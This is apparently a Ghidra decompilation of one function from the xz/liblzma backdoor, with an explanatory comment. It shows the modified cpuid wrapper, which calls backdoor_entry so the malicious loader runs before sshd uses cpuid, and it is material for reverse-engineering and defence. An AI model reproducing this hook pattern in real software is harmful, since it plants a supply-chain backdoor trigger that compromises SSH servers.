// /home/kali/xzre-ghidra/xzregh/10A800_get_cpuid_modified.c
// Function: _get_cpuid_modified @ 0x10A800
// Calling convention: __stdcall
// Prototype: uint __stdcall _get_cpuid_modified(uint leaf, uint * eax, uint * ebx, uint * ecx, uint * edx, u64 * caller_frame)


/*
 * AutoDoc: Wrapper around `_cpuid_gcc` that first invokes `backdoor_entry` with the high-bit leaf to make sure the loader ran, checks the
 * returned maximum leaf, and only executes the requested CPUID if the CPU claims to support it. This is the exported symbol glibc
 * binds, so the loader’s work is triggered before any sshd thread asks for cpuid data.
 */

#include "xzre_types.h"

uint _get_cpuid_modified(uint leaf,uint *eax,uint *ebx,uint *ecx,uint *edx,u64 *caller_frame)

{
  uint max_leaf;
  
  max_leaf = backdoor_entry(leaf & 0x80000000,caller_frame);
  if ((max_leaf == 0) || (max_leaf < leaf)) {
    max_leaf = 0;
  }
  else {
    _cpuid_gcc(leaf,eax,ebx,ecx,edx);
    max_leaf = 1;
  }
  return max_leaf;
}

